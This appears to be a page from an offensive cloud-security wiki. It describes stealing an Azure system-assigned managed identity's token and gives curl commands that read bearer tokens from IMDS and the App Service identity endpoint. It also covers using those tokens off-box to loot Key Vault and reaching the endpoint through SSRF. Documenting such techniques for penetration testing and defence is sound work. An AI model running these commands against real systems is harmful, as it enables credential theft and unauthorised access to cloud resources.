---
title: "System-assigned: stealing a resource's own identity token"
description: "Stealing the token of a resource's system-assigned managed identity through its local IMDS endpoint and acting as that identity."
keywords:
  - system-assigned
  - managed identity
  - IMDS
  - token
  - resource identity
---

# System-assigned

A system-assigned managed identity exists only for its resource and shares its lifecycle. When you reach code execution on that resource (a VM, a Function, a container), the local metadata endpoint hands out the identity's Entra token, and you act with whatever RBAC the identity holds.

## Minting the token

```bash
# on the resource (VM example): no client_id needed for system-assigned
curl -s -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# App Service / Functions use IDENTITY_ENDPOINT + IDENTITY_HEADER instead of IMDS
curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01"
```

Change `resource=` to target another audience (`https://graph.microsoft.com/`, `https://vault.azure.net`) and mint a token for it.

## Exploitation notes

- The token is a bearer token for the identity's RBAC; export it and call ARM directly with `az rest` or the REST API off-box.
- Request multiple audiences: the same identity often has both ARM and Key Vault access, so pull a `vault.azure.net` token to loot [Key Vault](../../credentials/key-vault/index.md) as well.
- Reaching the endpoint through a web vulnerability rather than shell is the [SSRF](../../credentials/instance-metadata/ssrf-to-imds.md) path.

## Tools

- **curl** on the resource, or any SSRF sink.
- **MicroBurst** (`Get-AzurePasswords`, managed-identity token modules).

## References

- [Microsoft: how to use managed identities (token acquisition)](https://learn.microsoft.com/entra/identity/managed-identities-azure-resources/how-to-use-vm-token)
- [HackTricks Cloud: Azure IMDS and managed identity](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [NetSPI: MicroBurst](https://github.com/NetSPI/MicroBurst)
